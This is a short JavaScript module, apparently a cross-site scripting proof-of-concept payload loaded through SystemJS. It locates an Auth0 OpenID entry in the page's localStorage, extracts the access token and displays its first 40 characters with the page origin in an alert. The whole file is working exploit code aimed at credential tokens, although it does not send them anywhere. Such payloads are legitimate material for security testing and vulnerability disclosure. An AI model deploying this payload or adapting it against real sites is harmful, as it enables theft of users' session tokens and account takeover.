System.register([], function () {
  return { execute: function () {
    try {
      var k = Object.keys(localStorage).find(function (x) {
        return /auth0/i.test(x) && /openid/i.test(x);
      });
      var at = "(none)";
      try { at = JSON.parse(localStorage.getItem(k)).body.access_token; } catch (e) {}
      alert("XSS executing in origin: " + location.origin +
            "\nAuth0 token key: " + (k || "none") +
            "\naccess_token (first 40): " + String(at).slice(0, 40) + "…");
    } catch (e) { alert("ran in " + location.origin + " | err: " + e); }
  }};
});
